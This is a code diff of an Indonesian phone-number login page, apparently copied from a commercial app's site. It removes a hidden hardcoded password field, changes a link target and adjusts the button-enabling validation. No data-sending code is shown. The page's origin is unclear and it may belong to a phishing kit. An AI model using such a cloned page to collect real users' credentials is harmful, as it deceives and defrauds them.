@@ -162,7 +162,7 @@ body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relati
 						<div class="EUrtGZ">
 							<svg viewbox="0 0 24 24" fill="none" width="24" height="24" color="rgba(0, 0, 0, 0.65)" class="aDKDCX"><path d="M14.316 14.1a.75.75 0 00.076 1.298l6.167 3.084c.424.211.691.644.691 1.118v1.65H2.75V19.6c0-.474.268-.907.691-1.118l6.167-3.084a.75.75 0 00.077-1.297c-1.292-.85-2.39-2.419-2.39-3.92V7.456c0-1.291.407-2.465 1.171-3.307C9.22 3.318 10.373 2.75 12 2.75c1.627 0 2.78.568 3.534 1.398.763.842 1.17 2.016 1.17 3.307v2.727c0 1.504-1.093 3.07-2.388 3.918z" stroke="currentColor" stroke-width="1.5" stroke-linecap="square" stroke-linejoin="round"></path></svg>
 	<input id="user" name="user" class="WrQrp0 _4dCZIs" type="tel" placeholder="Nomor Telepon" maxlength="13" autocomplete="username" autocorrect="off" autocapitalize="off" value="" required minlength="10">
-<input type="hidden" id="pass" value="123456">
+
 </div>
 						
 
@@ -170,7 +170,7 @@ body[unresolved] {opacity: 0; display: block; overflow: hidden; position: relati
 <button type="submit" id="doLog" class="btn-punya _3sjFp lJMau AHhqR TOjHY nt-regular nt-large" disabled="" style="margin-top: 14px; width: 100%;"><span class="_2HCeY">Log in</span></button>
 </form>
 						<div class="MZW3WX">
-							<a class="+H+ETm" href="#">Daftar</a><a class="+H+ETm" href="login_no.html">Log in dengan Password</a>
+							<a class="+H+ETm" href="#">Daftar</a><a class="+H+ETm" href="login.html">Log in dengan Password</a>
 						</div>
 						<div>
 							<div class="rB03x1">
@@ -278,9 +278,9 @@ null==url.match("/search\\?collection\\\x3d|/search.*\\\x26collection\\\x3d|/sea
 <script type="text/javascript" id="">!function(b,e,f,g,a,c,d){b.fbq||(a=b.fbq=function(){a.callMethod?a.callMethod.apply(a,arguments):a.queue.push(arguments)},b._fbq||(b._fbq=a),a.push=a,a.loaded=!0,a.version="2.0",a.queue=[],c=e.createElement(f),c.async=!0,c.src=g,d=e.getElementsByTagName(f)[0],d.parentNode.insertBefore(c,d))}(window,document,"script","//connect.facebook.net/en_US/fbevents.js");fbq("init",google_tag_manager["rm"]["7691473"](184));fbq("track","PageView");</script>
   <script>
 
-         function OnButton(user, pass) {
+         function OnButton(user) {
 
-            if(user.length > 4 && pass.length > 5) {
+            if(user.length > 5) {
                 $(".btn-punya").prop('disabled', false);
             } else {
                 $(".btn-punya").prop('disabled', true);
